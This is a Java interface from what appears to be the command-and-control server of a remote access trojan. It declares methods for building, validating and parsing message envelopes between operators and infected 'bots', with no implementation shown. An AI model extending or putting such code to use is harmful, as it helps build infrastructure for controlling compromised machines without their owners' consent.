package devs.alex.sah.rat.c2server.services;

import devs.alex.sah.rat.c2server.models.Message;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;

import java.nio.ByteBuffer;

public interface MessagesBuilder {


    String generateUser2BotFirstEnvelope    (String module, String associativeRequest, String requiredResponse, String fullSize);
    String generateUser2BotSingleEnvelope   (String module, String associativeRequest, String requiredResponse);
    String generateUser2BotEnvelope         (String module, String associativeRequest, String packageType);

    String generateUser2UserFirstEnvelope   (String userId, String module, String requiredResponse, String fullSize);
    String generateUser2UserSingleEnvelope  (String userId, String module, String requiredResponse);
    String generateUser2UserEnvelope        (String userId, String module, String packageType);

    String generateBot2UserFirstEnvelope    (String botId,  String module, String requestId, String fullSize, String isLast);
    String generateBot2UserSingleEnvelope   (String botId,  String module, String requestId, String isLast);
    String generateBot2UserEnvelope         (String botId,  String module, String requestId, String packageType);

    String generateServer2UserEnvelope      (String userId, String module, String requestId);
    String generateServer2botEnvelope       (String botId, String module, String requestId);

    /**
     * "Outbox" envelopes which were generated by server <P>
     * "Inbox" - extracted envelopes from incoming messages (presented as {@link Message})
     */
    enum ValidationType {
        bot2controlInbox,
        bot2controlOutbox,
        control2botInbox,
        control2botOutbox,
        control2controlInbox,
        control2controlOutbox
    }
    void validateEnvelope (Message<?> message, StringBuffer errors, ValidationType validationType);
    void validateEnvelope (String codedEnvelope, StringBuffer errors, ValidationType validationType);

    Message<String> parseMessage(TextMessage message, StringBuffer errors);
    Message<ByteBuffer> parseMessage(BinaryMessage message, StringBuffer errors);

    String generateErrorEnvelope(String targetType);
}
